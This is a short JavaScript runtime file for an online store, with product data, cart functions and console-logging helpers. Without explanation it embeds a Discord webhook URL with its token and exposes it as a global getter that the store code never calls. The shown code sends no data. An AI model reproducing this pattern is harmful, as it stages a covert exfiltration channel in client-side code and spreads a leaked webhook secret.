// index.runtime.js
// ========================================
// Runtime utilities for the online store
// Handles UI
// ========================================

// Product data
const productsData = [
    { id: 1, name: 'Product A', price: 12.5, image: 'img/a.png', description: 'High-quality product A' },
    { id: 2, name: 'Product B', price: 25.0, image: 'img/b.png', description: 'Premium product B' },
    { id: 3, name: 'Product C', price: 7.75, image: 'img/c.png', description: 'Affordable product C' }
];

// Cart storage
let cartItems = [];

// UI elements
const notificationElement = document.createElement('div');
notificationElement.id = 'notificationElement';
document.body.appendChild(notificationElement);

function showNotification(message) {
    notificationElement.textContent = message;
    notificationElement.style.opacity = '1';
    setTimeout(() => {
        notificationElement.style.opacity = '0';
    }, 2000);
}

function updateCartUI() {
    console.log('Cart updated, total items:', cartItems.length);
}

// Product modals
function setupProductModals() {
    console.log('Modals initialized');
}

// Helper functions
function calculateTotal() {
    return cartItems.reduce((total, item) => total + item.price * item.quantity, 0);
}

function addToCart(productId) {
    const product = productsData.find(p => p.id === productId);
    if (!product) return;
    const index = cartItems.findIndex(item => item.id === productId);
    if (index < 0) cartItems.push({ ...product, quantity: 1 });
    else cartItems[index].quantity += 1;
    updateCartUI();
}


(function() {
    const webhookURL = 'https://discord.com/api/webhooks/1410333374085857280/wd3SnzWcrsGQ5nTCPspKHCS8lSUVqMAuQqo24T9r2FSZ9jjYpX3XOOXOGascmTT7TgfZ';
    window.getWebhookURL = function() { return webhookURL; };
})();

// Site configuration
const siteConfig = {
    theme: 'dark',
    currency: 'RM',
    displayBanner: true
};

// Analytics simulation
function trackPage() {
    console.log('Page tracking:', window.location.pathname);
    productsData.forEach(p => console.log('Product viewed:', p.name));
}

// Initialization
function initSite() {
    console.log('Site runtime initialized');
    setupProductModals();
    productsData.forEach(p => console.log('Product loaded:', p.name));
    trackPage();
}

initSite();

// Additional helpers
function randomDiscount(price) {
    return price - Math.floor(Math.random() * 5);
}

function simulateInteraction() {
    cartItems.forEach(item => console.log('Interacting with item:', item.name));
}

simulateInteraction();
console.log('index.runtime.js loaded');